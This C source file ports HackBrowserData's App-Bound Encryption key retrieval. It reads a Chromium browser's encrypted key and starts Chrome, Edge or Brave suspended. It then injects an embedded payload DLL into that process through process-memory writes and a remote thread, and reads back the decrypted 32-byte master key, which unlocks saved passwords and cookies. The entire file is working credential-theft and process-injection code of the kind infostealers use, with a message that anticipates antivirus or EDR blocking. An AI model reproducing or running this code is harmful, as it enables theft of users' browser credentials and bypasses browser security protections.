/* App-Bound Encryption master key retrieval via reflective injection.
 * C port of HackBrowserData utils/injector/reflective_windows.go +
 * masterkey/abe_windows.go. The embedded payload DLL is built from
 * abe_native/ (verbatim) and linked in as a binary object by CMake. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "abe/abe_inject.h"
#include "abe/abe_native/bootstrap_layout.h"
#include "browser/crypto.h"

/* Embedded payload (CMake: ld -r -b binary). */
#ifdef ABE_PAYLOAD_EMBEDDED
extern const unsigned char _binary_abe_extractor_amd64_bin_start[];
extern const unsigned char _binary_abe_extractor_amd64_bin_end[];
#endif

/* ---- scratch layout constants (mirror bootstrap_layout.h) ---- */
#define ABE_SCRATCH_SIZE   (0x40 + 32)
#define ABE_MARKER_OFF     0x28
#define ABE_STATUS_OFF     0x29
#define ABE_ERRCODE_OFF    0x2A
#define ABE_HRESULT_OFF    0x2C
#define ABE_COMERR_OFF     0x30
#define ABE_KEY_OFF        0x40
#define ABE_STATUS_READY   0x01
#define ABE_PARAMS_SIZE    48
#define ABE_PARAM_SCRATCH_BASE 0x00
#define ABE_PARAM_LOAD_LIBRARY 0x08
#define ABE_PARAM_GET_PROCADDR 0x10
#define ABE_PARAM_VIRTUAL_ALLOC 0x18
#define ABE_PARAM_VIRTUAL_PROTECT 0x20
#define ABE_PARAM_NT_FLUSH_IC 0x28

static char g_diag[256];

const char* abe_last_diag(void) { return g_diag; }

static void set_diag(const char* msg) {
    snprintf(g_diag, sizeof(g_diag), "%s", msg ? msg : "");
}

/* Minimal JSON string extractor (same semantics as crypto.c's helper). */
static char* abe_json_string(const char* json, const char* key) {
    char pat[128];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = strstr(json, pat);
    if (!p) return NULL;
    const char* q = p + strlen(pat);
    while (*q == ' ' || *q == ':') q++;
    if (*q != '"') return NULL;
    q++;
    const char* e = strchr(q, '"');
    if (!e || e == q) return NULL;
    char* out = (char*)malloc((size_t)(e - q) + 1);
    if (!out) return NULL;
    memcpy(out, q, (size_t)(e - q));
    out[e - q] = 0;
    return out;
}

/* ---- PE parsing: locate the file offset of an exported function ---- */
static uint32_t pe_rva_to_offset(const uint8_t* pe, int len, uint32_t rva) {
    if (len < (int)sizeof(IMAGE_DOS_HEADER)) return 0;
    IMAGE_DOS_HEADER dos;
    memcpy(&dos, pe, sizeof(dos));
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
    int nt_off = dos.e_lfanew;
    if (nt_off <= 0 || nt_off + sizeof(IMAGE_NT_HEADERS64) > len) return 0;
    uint32_t nsec;
    memcpy(&nsec, pe + nt_off + 6, 2);              /* FileHeader.NumberOfSections */
    uint32_t sec_off = (uint32_t)nt_off + sizeof(IMAGE_NT_HEADERS64);
    if (sec_off + nsec * 40 > (uint32_t)len) return 0;
    for (uint32_t i = 0; i < nsec; i++) {
        const uint8_t* s = pe + sec_off + i * 40;
        uint32_t vaddr, rawsz, rawptr;
        memcpy(&vaddr, s + 12, 4);                   /* VirtualAddress */
        memcpy(&rawsz, s + 16, 4);                   /* SizeOfRawData */
        memcpy(&rawptr, s + 20, 4);                  /* PointerToRawData */
        if (rva >= vaddr && rva < vaddr + rawsz)
            return rawptr + (rva - vaddr);
    }
    return 0;
}

static int pe_find_export(const uint8_t* pe, int len, const char* name, uint32_t* out_off) {
    if (len < (int)sizeof(IMAGE_DOS_HEADER)) return -1;
    IMAGE_DOS_HEADER dos;
    memcpy(&dos, pe, sizeof(dos));
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return -1;
    int nt_off = dos.e_lfanew;
    if (nt_off + sizeof(IMAGE_NT_HEADERS64) > len) return -1;
    /* OptionalHeader.DataDirectory[0] = export directory */
    uint32_t exp_rva, exp_size;
    memcpy(&exp_rva, pe + nt_off + 24 + 112, 4);
    memcpy(&exp_size, pe + nt_off + 24 + 116, 4);
    if (!exp_rva || !exp_size) return -1;
    uint32_t exp_off = pe_rva_to_offset(pe, len, exp_rva);
    if (!exp_off || exp_off + 40 > (uint32_t)len) return -1;
    uint32_t n_names, funcs_rva, names_rva, ords_rva;
    memcpy(&n_names,   pe + exp_off + 24, 4);        /* NumberOfNames */
    memcpy(&funcs_rva, pe + exp_off + 28, 4);        /* AddressOfFunctions */
    memcpy(&names_rva, pe + exp_off + 32, 4);        /* AddressOfNames */
    memcpy(&ords_rva,  pe + exp_off + 36, 4);        /* AddressOfNameOrdinals */
    uint32_t funcs_off = pe_rva_to_offset(pe, len, funcs_rva);
    uint32_t names_off = pe_rva_to_offset(pe, len, names_rva);
    uint32_t ords_off  = pe_rva_to_offset(pe, len, ords_rva);
    if (!funcs_off || !names_off || !ords_off) return -1;
    size_t nlen = strlen(name);
    for (uint32_t i = 0; i < n_names; i++) {
        uint32_t name_rva;
        memcpy(&name_rva, pe + names_off + i * 4, 4);
        uint32_t name_file = pe_rva_to_offset(pe, len, name_rva);
        if (!name_file || name_file >= (uint32_t)len) continue;
        if (_strnicmp((const char*)pe + name_file, name, nlen) == 0 &&
            (pe + name_file)[nlen] == 0) {
            uint16_t ord;
            memcpy(&ord, pe + ords_off + i * 2, 2);
            uint32_t fn_rva;
            memcpy(&fn_rva, pe + funcs_off + ord * 4, 4);
            uint32_t fn_off = pe_rva_to_offset(pe, len, fn_rva);
            if (!fn_off) return -1;
            *out_off = fn_off;
            return 0;
        }
    }
    return -1;
}

/* ---- resolve browser exe path ---- */
static int query_app_paths(const char* exe_name, char* out, int out_sz) {
    const char* roots[2] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\",
    };
    HKEY hive[2] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
    for (int h = 0; h < 2; h++) {
        char key[256];
        snprintf(key, sizeof(key), "%s%s", roots[h], exe_name);
        HKEY k;
        if (RegOpenKeyExA(hive[h], key, 0, KEY_READ, &k) != 0) continue;
        DWORD sz = (DWORD)out_sz, type = 0;
        LSTATUS rc = RegQueryValueExA(k, NULL, NULL, &type, (BYTE*)out, &sz);
        RegCloseKey(k);
        if (rc == 0 && (type == REG_SZ || type == REG_EXPAND_SZ) && out[0]) {
            /* expand % vars if present */
            char exp[MAX_PATH];
            DWORD n = ExpandEnvironmentStringsA(out, exp, sizeof(exp));
            if (n > 0 && n < sizeof(exp)) { memcpy(out, exp, n); }
            return 0;
        }
    }
    return -1;
}

static int file_exists(const char* p) {
    DWORD a = GetFileAttributesA(p);
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

static int resolve_browser_exe(const char* exe_name, char* out, int out_sz) {
    if (query_app_paths(exe_name, out, out_sz) == 0 && file_exists(out)) return 0;
    const char* fallbacks[8];
    int n = 0;
    if (_stricmp(exe_name, "msedge.exe") == 0) {
        fallbacks[n++] = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
        fallbacks[n++] = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
    } else if (_stricmp(exe_name, "chrome.exe") == 0) {
        fallbacks[n++] = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        fallbacks[n++] = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
    } else if (_stricmp(exe_name, "brave.exe") == 0) {
        fallbacks[n++] = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
        fallbacks[n++] = "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
    }
    for (int i = 0; i < n; i++)
        if (file_exists(fallbacks[i])) { snprintf(out, out_sz, "%s", fallbacks[i]); return 0; }
    return -1;
}

/* Identify the browser from the "Local State" path and resolve its exe. */
static int browser_exe_from_state_path(const char* state_path, char* exe_out, int out_sz) {
    const char* exe_name = NULL;
    if (strstr(state_path, "Microsoft\\Edge") || strstr(state_path, "Microsoft/Edge"))
        exe_name = "msedge.exe";
    else if (strstr(state_path, "BraveSoftware"))
        exe_name = "brave.exe";
    else if (strstr(state_path, "Google\\Chrome") || strstr(state_path, "Google/Chrome"))
        exe_name = "chrome.exe";
    if (!exe_name) {
        set_diag("ABE: unknown browser from Local State path");
        return -1;
    }
    return resolve_browser_exe(exe_name, exe_out, out_sz);
}

/* ---- injector (port of reflective_windows.go) ---- */
static int write_remote(HANDLE proc, const void* buf, size_t len, uintptr_t* out_addr,
                        DWORD protect, const char* what) {
    LPVOID base = VirtualAllocEx(proc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) { set_diag("ABE: VirtualAllocEx failed"); return -1; }
    SIZE_T written = 0;
    if (!WriteProcessMemory(proc, base, buf, len, &written) || written != len) {
        set_diag("ABE: WriteProcessMemory failed"); return -1;
    }
    DWORD old = 0;
    if (protect) {
        if (!VirtualProtectEx(proc, base, len, protect, &old)) {
            set_diag("ABE: VirtualProtectEx failed"); return -1;
        }
        FlushInstructionCache(proc, base, len);
    }
    *out_addr = (uintptr_t)base;
    (void)what;
    return 0;
}

static uint64_t self_proc_addr(const char* mod, const char* fn) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) return 0;
    return (uint64_t)(uintptr_t)GetProcAddress(h, fn);
}

int abe_get_master_key(const char* state_file_path, uint8_t out_key[32]) {
    g_diag[0] = 0;
    if (!state_file_path || !out_key) return -1;

#ifdef ABE_PAYLOAD_EMBEDDED
    const uint8_t* payload = _binary_abe_extractor_amd64_bin_start;
    int payload_len = (int)(_binary_abe_extractor_amd64_bin_end -
                            _binary_abe_extractor_amd64_bin_start);
#else
    set_diag("ABE: payload not embedded (build without ABE_PAYLOAD_EMBEDDED)");
    return -1;
#endif
    if (payload_len <= 0) { set_diag("ABE: empty payload"); return -1; }

    /* app_bound_encrypted_key from Local State (APPB prefix stripped) */
    int fl = 0;
    char* state = (char*)read_file(state_file_path, &fl);
    if (!state) { set_diag("ABE: cannot read Local State"); return -1; }
    char* b64 = abe_json_string(state, "app_bound_encrypted_key");
    free(state);
    if (!b64 || !b64[0]) { free(b64); set_diag("ABE: no app_bound_encrypted_key"); return -1; }
    int bl = (int)strlen(b64);
    uint8_t* enc = (uint8_t*)malloc(bl + 1);
    int el = base64_decode(b64, enc, bl);
    free(b64);
    if (el <= 4 || enc[0] != 'A' || enc[1] != 'P' || enc[2] != 'P' || enc[3] != 'B') {
        free(enc); set_diag("ABE: bad APPB prefix"); return -1;
    }

    /* base64-encode the APPB-stripped key for the env var */
    int enc_raw_len = el - 4;
    int b64sz = ((enc_raw_len + 2) / 3) * 4 + 1;
    char* env_b64 = (char*)malloc(b64sz);
    {
        static const char* t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        const uint8_t* in = enc + 4;
        int i, j = 0, len = enc_raw_len;
        for (i = 0; i + 2 < len; i += 3) {
            env_b64[j++] = t[(in[i] >> 2) & 0x3F];
            env_b64[j++] = t[((in[i] & 3) << 4) | (in[i + 1] >> 4)];
            env_b64[j++] = t[((in[i + 1] & 0xF) << 2) | (in[i + 2] >> 6)];
            env_b64[j++] = t[in[i + 2] & 0x3F];
        }
        if (i < len) {
            env_b64[j++] = t[(in[i] >> 2) & 0x3F];
            if (i + 1 < len) { env_b64[j++] = t[((in[i] & 3) << 4) | (in[i + 1] >> 4)];
                               env_b64[j++] = t[(in[i + 1] & 0xF) << 2];
                               env_b64[j++] = '='; }
            else { env_b64[j++] = t[(in[i] & 3) << 4];
                   env_b64[j++] = '='; env_b64[j++] = '='; }
        }
        env_b64[j] = 0;
    }
    free(enc);

    char exe[MAX_PATH];
    if (browser_exe_from_state_path(state_file_path, exe, sizeof(exe)) != 0) {
        free(env_b64); return -1;
    }

    uint32_t loader_off = 0;
    if (pe_find_export(payload, payload_len, "Bootstrap", &loader_off) != 0) {
        free(env_b64); set_diag("ABE: Bootstrap export not found in payload"); return -1;
    }

    /* pass env to the suspended child (it inherits ours) */
    SetEnvironmentVariableA("HBD_ABE_ENC_B64", env_b64);
    free(env_b64);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(exe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        snprintf(g_diag, sizeof(g_diag), "ABE: CreateProcess(%s) failed", exe);
        SetEnvironmentVariableA("HBD_ABE_ENC_B64", NULL);
        return -1;
    }

    int result = -1;
    uintptr_t remote_base = 0, scratch_base = 0, params_base = 0;
    do {
        if (write_remote(pi.hProcess, payload, payload_len, &remote_base,
                         PAGE_EXECUTE_READ, "payload") != 0) break;

        {
            static uint8_t zero_scratch[ABE_SCRATCH_SIZE];
            if (write_remote(pi.hProcess, zero_scratch, ABE_SCRATCH_SIZE, &scratch_base, 0, "scratch") != 0) break;
        }

        uint64_t params[6] = { 0 };
        params[0] = scratch_base;
        params[1] = self_proc_addr("kernel32.dll", "LoadLibraryA");
        params[2] = self_proc_addr("kernel32.dll", "GetProcAddress");
        params[3] = self_proc_addr("kernel32.dll", "VirtualAlloc");
        params[4] = self_proc_addr("kernel32.dll", "VirtualProtect");
        params[5] = self_proc_addr("ntdll.dll", "NtFlushInstructionCache");
        int ok = 1;
        for (int i = 1; i < 6; i++) if (!params[i]) ok = 0;
        if (!ok) { set_diag("ABE: cannot resolve bootstrap import addresses"); break; }
        if (write_remote(pi.hProcess, params, ABE_PARAMS_SIZE, &params_base, 0, "params") != 0) break;

        HANDLE th = CreateRemoteThread(pi.hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)(uintptr_t)(remote_base + loader_off),
            (LPVOID)params_base, 0, NULL);
        if (!th) {
            DWORD ec = 0;
            GetExitCodeProcess(pi.hProcess, &ec);
            if (ec == STILL_ACTIVE)
                set_diag("ABE: CreateRemoteThread failed (target alive; EDR/AV may block injection)");
            else
                snprintf(g_diag, sizeof(g_diag), "ABE: CreateRemoteThread failed (target exited 0x%x)", ec);
            break;
        }
        DWORD wait = WaitForSingleObject(th, 30000);
        CloseHandle(th);
        if (wait != WAIT_OBJECT_0) { set_diag("ABE: remote thread wait failed/timeout"); break; }

        /* read scratch: header then key */
        uint8_t scratch[ABE_SCRATCH_SIZE];
        SIZE_T nread = 0;
        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)scratch_base, scratch, sizeof(scratch), &nread) ||
            nread != sizeof(scratch)) {
            set_diag("ABE: ReadProcessMemory(scratch) failed"); break;
        }
        if (scratch[ABE_STATUS_OFF] != ABE_STATUS_READY) {
            snprintf(g_diag, sizeof(g_diag),
                     "ABE: payload error code=0x%02x hr=0x%08x comErr=%u",
                     scratch[ABE_ERRCODE_OFF],
                     *(const uint32_t*)(scratch + ABE_HRESULT_OFF),
                     *(const uint32_t*)(scratch + ABE_COMERR_OFF));
            break;
        }
        memcpy(out_key, scratch + ABE_KEY_OFF, 32);
        result = 0;
        snprintf(g_diag, sizeof(g_diag), "ABE: master key retrieved via reflective injection (%s)", exe);
    } while (0);

    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    SetEnvironmentVariableA("HBD_ABE_ENC_B64", NULL);
    return result;
}
